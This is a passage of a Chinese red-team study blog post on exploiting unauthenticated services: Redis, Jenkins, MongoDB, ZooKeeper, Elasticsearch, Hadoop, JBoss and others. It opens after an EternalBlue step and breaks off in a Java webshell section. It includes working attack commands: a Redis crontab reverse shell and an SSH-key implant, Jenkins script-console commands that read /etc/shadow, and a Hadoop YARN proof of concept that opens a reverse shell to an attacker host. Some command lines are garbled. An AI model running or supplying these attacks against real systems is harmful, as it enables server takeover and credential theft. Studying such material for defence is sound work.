alt="生成dll文件"></p><p><strong>操作机</strong></p><p>py下载地址：fb.py</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/misterch0c/</span>shadowbroker<span class="hljs-regexp">/tree/m</span>aster/windows</code></pre><p>1)设置ip<br>2)<code>use Eternalblue</code>使用 Eternalblue插件<br>3)<code>use doublepulsar</code>使用 doublepulsar插件<br>4)最后执行dll反弹shell<br>操作步骤不截图了挺简单的…<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/03.png" alt="成功弹回会话"></p><hr><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞</p><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h4><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库</p><p><strong>reds-cli</strong></p><pre><code class="hljs bash">redis-cli -h 192.168.1.106 -p 6379</code></pre><p><strong>写入文件</strong></p><pre><code class="hljs bash">redis 192.168.1.106:6379&gt; CONFIG GET dir1) <span class="hljs-string">&quot;dir&quot;</span>2) <span class="hljs-string">&quot;C:\\Users\\Administrator\\Desktop\\Redis\\Redis&quot;</span>redis 192.168.1.106:6379&gt; CONFIG <span class="hljs-built_in">set</span> dir C:/OKredis 192.168.1.106:6379&gt; SET foobar <span class="hljs-string">&quot;who are you? iceH&quot;</span>OKredis 192.168.1.106:6379&gt; CONFIG GET dbfilename1) <span class="hljs-string">&quot;dbfilename&quot;</span>2) <span class="hljs-string">&quot;dump.rdb&quot;</span>redis 192.168.1.106:6379&gt; CONFIG SET dbfilename write_file.logOKredis 192.168.1.106:6379&gt; saveOKredis 192.168.1.106:6379&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/04.png" alt="redis写文件"></p><p><strong>反弹shell-Linux</strong></p><pre><code class="hljs bash">127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> shell <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/88 0&gt;&amp;1\n&quot;</span> OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root OK127.0.0.1:6379 &gt; save[238] xx May xx:xx:xx DB saved on diskOK</code></pre><p><strong>写入公钥</strong><br>生成公钥：</p><pre><code class="hljs bash">ssh-keygen-t rsa   一直回车即可</code></pre><pre><code class="hljs bash">127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /root/.ssh/OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename authorized_keysOK127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxx root@kali\n\n\n&quot;</span>OK127.0.0.1:6379 &gt; saveOK</code></pre><p><strong>清空数据库</strong></p><pre><code class="hljs bash">172.16.x.x:6379 &gt; FLUSHALL</code></pre><hr><h3 id="未授权漏洞总结"><a href="#未授权漏洞总结" class="headerlink" title="未授权漏洞总结"></a>未授权漏洞总结</h3><p>这一部分，书上不咋详细，等有时间我再单独发笔记</p><h4 id="Redis-1"><a href="#Redis-1" class="headerlink" title="Redis"></a>Redis</h4><p><strong>计划任务反弹shell</strong></p><p>利用计划任务执行命令反弹shell</p><p>在<code>redis</code>以<code>root</code>权限运行时可以写<code>crontab</code>来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p><pre><code class="hljs bash">nc -lvnp 8989</code></pre><p>然后执行命令：</p><pre><code class="hljs bash">redis-cli -h 192.168.x.x192.168.x.x:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/8989 0&gt;&amp;1\n&quot;</span>192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root192.168.x.x:6379 &gt; save</code></pre><p><strong>写入公钥</strong><br>获取rsa</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>将公钥写入foo.txt，注意内容前后要加2个换行</p><pre><code class="hljs lsl">(echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat /root/ssh/id_rsa.pub; echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) &gt; foo.txt</code></pre><p>将foo.txt放入键crackit里</p><pre><code class="hljs routeros">cat foo.txt redis-cli -h<span class="hljs-built_in"> IP </span>-x <span class="hljs-builtin-name">set</span> crackit</code></pre><p>连接目标</p><pre><code class="hljs x86asm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-built_in">Ip</span></code></pre><p>设置目标的redis的配置文件<br>设置数据库备份目录为/root/.ssh/</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span>: 6379 &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dir</span> /<span class="hljs-selector-tag">root</span>/<span class="hljs-selector-class">.ssh</span>/</code></pre><p>设置数据库备份文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dbfilename</span> <span class="hljs-selector-tag">authorized_keys</span></code></pre><p>此时公钥成功写入目标机子，文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">save</span></code></pre><p>利用私钥链接目标</p><pre><code class="hljs llvm">ssh -i /root/.ssh/id_rsa root<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> set <span class="hljs-keyword">x</span> <span class="hljs-string">&quot;\n\n\n</span></code></pre><p>参考资料：</p><ul><li><a href="https://segmentfault.com/a/1190000009811404">https://segmentfault.com/a/1190000009811404</a></li><li><a href="https://github.com/andymccurdy/redis-py">https://github.com/andymccurdy/redis-py</a></li></ul><hr><h4 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h4><p>默认是8080端口未授权访问就是任意用户都能访问都能执行命令</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8080</span>/jenkins/manage<span class="hljs-number">127.0.0.1:8080</span>/jenkins/script</code></pre><p><strong>常用命令集合：</strong></p><pre><code class="hljs arduino"><span class="hljs-built_in">println</span> <span class="hljs-string">&quot;whoami&quot;</span>.execute().<span class="hljs-built_in">text</span></code></pre><p><strong>Linux：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">println</span> <span class="hljs-selector-tag">ifconifg</span> <span class="hljs-selector-tag">-a</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span><span class="hljs-selector-tag">println</span> &quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">passwd</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span><span class="hljs-selector-tag">printin</span>&quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">shadow</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span></code></pre><p><strong>Windows：</strong></p><pre><code class="hljs gradle"><span class="hljs-keyword">println</span> <span class="hljs-string">&quot;ipconfig /all&quot;</span>.execute().text<span class="hljs-keyword">def</span> sout = <span class="hljs-keyword">new</span> StringBuffer(), serr = <span class="hljs-keyword">new</span> StringBuffer()<span class="hljs-keyword">def</span> proc = <span class="hljs-string">&#x27;ipconfig&#x27;</span>.execute()proc.consumeProcessOutput(sout, serr)proc.<span class="hljs-keyword">waitForOrKill</span>(<span class="hljs-number">1000</span>)<span class="hljs-keyword">println</span> <span class="hljs-string">&quot;out&gt; $sout err&gt; $serr&quot;</span></code></pre><p><strong>更多可参考：</strong></p><p><a href="https://blog.csdn.net/zhangpeng999123/article/details/108227041">https://blog.csdn.net/zhangpeng999123/article/details/108227041</a></p><hr><h4 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h4><p>利用可视化工具连接默认端口：28017<br>推荐Robo3t 1.1 即可</p><p>python mongodb_unauth.py</p><pre><code class="hljs python">coding:utf-<span class="hljs-number">8</span>mongodb未授权检测脚本usage: python3 mongodb_unauth.py ip port默认端口<span class="hljs-number">28017</span>和<span class="hljs-number">27017</span><span class="hljs-keyword">from</span> pymongo <span class="hljs-keyword">import</span> MongoClient<span class="hljs-keyword">import</span> sysip = sys.argv[<span class="hljs-number">1</span>] port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">try</span>:conn = MongoClient(ip, port, socketTimeoutMS=<span class="hljs-number">5000</span>)<span class="hljs-comment">#连接 MongoDB，延时5秒</span>dbs = conn.database_names()print(<span class="hljs-string">&#x27;[ok] -&gt; &#123;&#125;:&#123;&#125; database_names : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, dbs))conn.close() <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:error = e.argsprint(<span class="hljs-string">&#x27;[-] -&gt; &#123;&#125;:&#123;&#125; error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, error))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> mongodb_unauth.py <span class="hljs-number">192.168.175.1</span> <span class="hljs-number">27017</span></code></pre><hr><h4 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h4><p>默认端口：2181、2171</p><pre><code class="hljs shell">ls / #查看所有节点 get /#获取某个节点信息</code></pre><p>脚本检测</p><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><span class="hljs-keyword">import</span> socket<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_info</span>():</span>    plugin_info = &#123;        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Zookeeper未授权访问&quot;</span>,        <span class="hljs-string">&quot;info&quot;</span>: <span class="hljs-string">&quot;Zookeeper Unauthorized access&quot;</span>,        <span class="hljs-string">&quot;level&quot;</span>: <span class="hljs-string">&quot;中危&quot;</span>,        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;未授权访问&quot;</span>,        <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;c4bbage@qq.com&quot;</span>,        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://hackerone.com/reports/154369&quot;</span>,        <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;server:Zookeeper&quot;</span>,        <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-number">1</span>    &#125;    <span class="hljs-keyword">return</span> plugin_info<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">ip, port, timeout</span>):</span>    <span class="hljs-keyword">try</span>:        socket.setdefaulttimeout(timeout)        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, <span class="hljs-built_in">int</span>(port)))        flag = <span class="hljs-string">&quot;envi&quot;</span>        <span class="hljs-comment"># envi</span>        <span class="hljs-comment"># dump</span>        <span class="hljs-comment"># reqs</span>        <span class="hljs-comment"># ruok</span>        <span class="hljs-comment"># stat</span>        s.send(flag)        data = s.recv(<span class="hljs-number">1024</span>)        s.close()        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Environment&#x27;</span> <span class="hljs-keyword">in</span> data:            <span class="hljs-keyword">return</span> <span class="hljs-string">u&quot;Zookeeper Unauthorized access&quot;</span>    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    ip = <span class="hljs-string">&quot;1.1.1.1&quot;</span>    <span class="hljs-built_in">print</span> check(ip, <span class="hljs-number">2181</span>, <span class="hljs-number">2</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/lihao21/article/details/51778255">https://blog.csdn.net/lihao21/article/details/51778255</a></li><li><a href="https://www.cnblogs.com/wushijin/p/11654076.html">https://www.cnblogs.com/wushijin/p/11654076.html</a></li></ul><hr><h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>默认端口：9200</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_plugin/</span>head/ web管理界面http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_cat/i</span>ndiceshtp:<span class="hljs-regexp">//</span> localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_river/</span>_search查看数据库敏感信息http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span>/_nodes 查看节点数</code></pre><p>脚本检测：</p><p><code>python3 elasticsearch_unauth.py 192.168.1.4 9200</code></p><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-comment"># elasticsearch未授权检测脚本</span><span class="hljs-comment"># author：ske</span><span class="hljs-comment"># usage: python3 elasticsearch_unauth.py ip port</span><span class="hljs-comment"># 默认端口9200</span><span class="hljs-comment"># http://localhost:9200/_plugin/head/ web管理界面</span><span class="hljs-comment"># http://localhost:9200/_cat/indices</span><span class="hljs-comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span><span class="hljs-comment"># http://localhost:9200/_nodes 查看节点数据</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">from</span> elasticsearch <span class="hljs-keyword">import</span> Elasticsearch<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> jsonip = sys.argv[<span class="hljs-number">1</span>]port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-comment"># 9200</span><span class="hljs-keyword">try</span>:    es = Elasticsearch(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>)  <span class="hljs-comment"># 连接Elasticsearch,延时5秒</span>    es.indices.create(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)    print(<span class="hljs-string">&#x27;[+] 成功连接 ：&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功创建测试节点unauth_text&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    es.index(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>, body=&#123;<span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>&#125;)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功往节点unauth_text插入数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    ret = es.get(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功获取节点unauth_text数据 : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, ret))    es.indices.delete(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 清除测试节点unauth_text数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; 存在ElasticSearch未授权漏洞&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;尝试获取节点信息：↓&#x27;</span>)    text = json.loads(requests.get(url=<span class="hljs-string">&#x27;http://&#123;&#125;:&#123;&#125;/_nodes&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>).text)    nodes_total = text[<span class="hljs-string">&#x27;_nodes&#x27;</span>][<span class="hljs-string">&#x27;total&#x27;</span>]    nodes = <span class="hljs-built_in">list</span>(text[<span class="hljs-string">&#x27;nodes&#x27;</span>].keys())    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; [&#123;&#125;] : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, nodes_total, nodes))<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    error = e.args    print(<span class="hljs-string">&#x27;[-] -&gt; &#123;&#125;  error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, error))</code></pre><hr><h4 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h4><p>默认端口11211</p><p>提示连接成功表示漏洞存在</p><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> &lt;target&gt; <span class="hljs-number">11211</span>，或 nc -vv &lt;target&gt; <span class="hljs-number">11211</span></code></pre><p>Memcached端口是对外开放的，用nc或Telne可以直接登录，查看信息，增加修改都可以</p><p>参考</p><ul><li><a href="https://www.cnblogs.com/mrhonest/p/10881389.html">https://www.cnblogs.com/mrhonest/p/10881389.html</a></li></ul><hr><h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构<br>用户可以在不了解分布式底层细节的情况下，开发分布式程序<br>充分利用集群的威力进行高速运算和存储<br>在默认情况下，Hadoop允许任意用户访问管理接口</p><p>poc:</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span> <span class="hljs-keyword">import</span> requests target = <span class="hljs-string">&#x27;http://127.0.0.1:8088/&#x27;</span>lhost = <span class="hljs-string">&#x27;192.168.220.137&#x27;</span> <span class="hljs-comment"># put your local host ip here, and listen at port 9999</span> url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span>resp = requests.post(url)app_id = resp.json()[<span class="hljs-string">&#x27;application-id&#x27;</span>]url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps&#x27;</span>data = &#123;    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;            <span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,        &#125;,    &#125;,    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,&#125;requests.post(url, json=data)修改exploit.py中的反弹IPpython exploit.py</code></pre><p>HDFS</p><pre><code class="hljs apache"><span class="hljs-attribute">NameNode</span>默认端口<span class="hljs-number">50070</span> <span class="hljs-attribute">DataNode</span>默认端口<span class="hljs-number">50075</span><span class="hljs-attribute">httpfs</span>默认端口<span class="hljs-number">14000</span><span class="hljs-attribute">journalnode</span>默认端口<span class="hljs-number">8480</span></code></pre><p>YARN （JobTracker ）</p><pre><code class="hljs apache"><span class="hljs-attribute">ResourceManager</span>默认端口<span class="hljs-number">8088</span> <span class="hljs-attribute">Jobtracker</span>默认端口<span class="hljs-number">50030</span> <span class="hljs-attribute">TaskTracker</span>默认端口<span class="hljs-number">50060</span></code></pre><p>Hue默认端口8080</p><p>YARN（JobTracker）</p><pre><code class="hljs crmsh"><span class="hljs-keyword">master</span><span class="hljs-title">默认端口6001</span>regionserver默认端口<span class="hljs-number">60030</span></code></pre><p>hive- server2默认端口1000</p><p>spark- jdbcserver默认端口10003</p><p>开启身份验证，防止未经授权用户访问</p><hr><h4 id="Couchdb"><a href="#Couchdb" class="headerlink" title="Couchdb"></a>Couchdb</h4><p>默认端口5984</p><p>在local.ini配置中：<br>bind_address = 设置为0.0.0.0则存在未授权访问</p><p>直接加端口进行访问即可<br><strong>exp：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/couchdb/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12636</span>/exp.py</code></pre><hr><h4 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h4><p>使用工具ldap admin直接连接即可</p><p>防御措施：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrhonest/</span>p/<span class="hljs-number">10948657</span>.html   --建议https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011607971/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86378361</span>   --管理方法</code></pre><hr><h4 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h4><p>vulhub漏洞平台可以复现，启用环境位置：vulhub-jboss-cve-2017-7504</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre><p>访问8080端口无账号密码就可进入</p><p>linux-kali-exp</p><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joaomatosf/</span>jexbosscd jexboss python3 jexboss.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.107</span>:<span class="hljs-number">8080</span>/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/05.png" alt="shell"></p><p>执行工具会依次检测一下项目，有漏洞就会显示红色的: <code>VULNERABLE</code>(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p><p>然后选择<code>YES</code>，就可以获得shell了</p><hr><h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><h4 id="Java下奇怪的命令执行"><a href="#Java下奇怪的命令执行" class="headerlink" title="Java下奇怪的命令执行"></a>Java下奇怪的命令执行</h4><p>参考文章：<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">http://www.lmxspace.com/2019/10/08/Java下奇怪的命令执行/</a></p><hr><h4 id="Shiro反序列化记录"><a href="#Shiro反序列化记录" class="headerlink" title="Shiro反序列化记录"></a>Shiro反序列化记录</h4><p>漏洞搭建安装和复现：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1078421">https://cloud.tencent.com/developer/article/1078421</a></li><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li></ul><p><strong>Reference</strong></p><p>Pwn a CTF Platform with Java JRMP Gadget</p><ul><li><a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li><li><a href="https://open.appscan.io/article-862.html">https://open.appscan.io/article-862.html</a></li><li><a href="https://www.jianshu.com/p/f10ad968e1b2">https://www.jianshu.com/p/f10ad968e1b2</a></li></ul><p>Apache Shiro Java反序列化漏洞分析</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/</a></li></ul><hr><h4 id="RMI-反序列化"><a href="#RMI-反序列化" class="headerlink" title="RMI-反序列化"></a>RMI-反序列化</h4><p><strong>参考</strong><br><strong>RM官方文档</strong></p><p><a href="https://xz.aliyun.com/t/4711#toc-3">https://xz.aliyun.com/t/4711#toc-3</a>   —浅显易懂的JAVA反序列化入门</p><p>知识盲区，需要脑补！！！！！</p><hr><h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>参考：（哎，知识盲区，加油脑补）</p><ul><li><a href="https://www.freebuf.com/vuls/115849.html">https://www.freebuf.com/vuls/115849.html</a>   –Jndi注入及Spring RCE漏洞分析</li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a>  –在Java中利用JNDI注入</li><li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a>   –如何绕过高版本JDK的限制进行JNDI注入利用</li></ul><p><strong>RPC</strong></p><ul><li><a href="https://www.jianshu.com/p/2accc2840a1b">https://www.jianshu.com/p/2accc2840a1b</a>  –如何给老婆解释什么是RPC</li><li><a href="https://www.freebuf.com/column/189835.html">https://www.freebuf.com/column/189835.html</a>   —深入理解JNDI注入与Java反序列化漏洞利用</li></ul><p><strong>ldap</strong></p><ul><li><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a>   –LDAP概念和原理介绍</li><li><a href="https://www.jianshu.com/p/7e4d99f6baaf">https://www.jianshu.com/p/7e4d99f6baaf</a>   –LDAP入门</li><li><a href="https://blog.csdn.net/caoyujiao520/article/details/82762097">https://blog.csdn.net/caoyujiao520/article/details/82762097</a>  –LDAP入门使用</li></ul><hr><h4 id="fastjson漏洞浅析"><a href="#fastjson漏洞浅析" class="headerlink" title="fastjson漏洞浅析"></a>fastjson漏洞浅析</h4><p><strong>前言</strong></p><p>Fastion是一个Java语言编写的高性能功能完善的JSON库。它采用一种“假定有序快速匹配”的算法，把JS0N Parse的性能提升到极致，是目前Java语言中最快的JSON库。 Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、We输出、 Android客户端等多种应用场景</p><p><strong>参考链接</strong></p><ul><li><a href="https://www.freebuf.com/column/207439.html">https://www.freebuf.com/column/207439.html</a>   —如何绕过高版本JDK的限制进行JNDI注入</li></ul><p>三个fastjson1.2…版本的poc，需要花很多时间来学习！！！</p><hr><h4 id="CVE-2019-11043-PHP远程代码执行复现"><a href="#CVE-2019-11043-PHP远程代码执行复现" class="headerlink" title="CVE-2019-11043 PHP远程代码执行复现"></a>CVE-2019-11043 PHP远程代码执行复现</h4><p><strong>简介</strong></p><p>相信大家都在满天的公众号预警里面看过很多,这里就一笔带过</p><p>2019年10月22日，国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP<br>该漏洞是 Andrew Danau在某比赛解决一道CTF题目时发现，向目标服务器URL发送%0a符号时，服务返回异常发现的漏洞</p><p>2019年9月26日，PHP官方发布漏洞通告其中指出使用 Nginx + php-fpm的服务器在部分配置下存在远程代码执行漏洞且该配置已被广泛使用，危害较大，影响较为广泛相关工具已经公开</p><p><strong>Github地址如下:</strong></p><pre><code class="hljs arcade">https:<span class="hljs-regexp">/github.com/</span>neex/phuip-fpizdam</code></pre><p>方法很多，我会写出来…后补！！！</p><hr><h4 id="java-webshell从入门到入狱系列1-基础篇"><a href="#java-webshell从入门到入狱系列1-基础篇" class="headerlink" title="java webshell从入门到入狱系列1-基础篇"></a>java webshell从入门到入狱系列1-基础篇</h4><p>本系列文章纯探讨技术交流，请勿使用本文探的技术构造恶意webshel非法入侵他人网站</p><p><strong>前言</strong></p><p>本系列，主要从webshell基础、 webshell的bypass技术（关键字、流量层、hook点逃逸）、后渗透的webshell维权（基于容器特性的隐式webshell、内存shell等）等方面和大家交流java中webshe‖的形式</p><p><strong>基础</strong></p><p><strong>java webshell种类</strong></p><p>现在大部分中间件容器，所能支持解析的后缀，主要是jsp，jspx 两种动态脚本为主，比如 tomcat容器中，默认能支持解析的动态脚本已经默认写在配置中了</p><pre><code class="hljs java">&lt;jsp-config&gt; &lt;jsp-property-group&gt; &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; 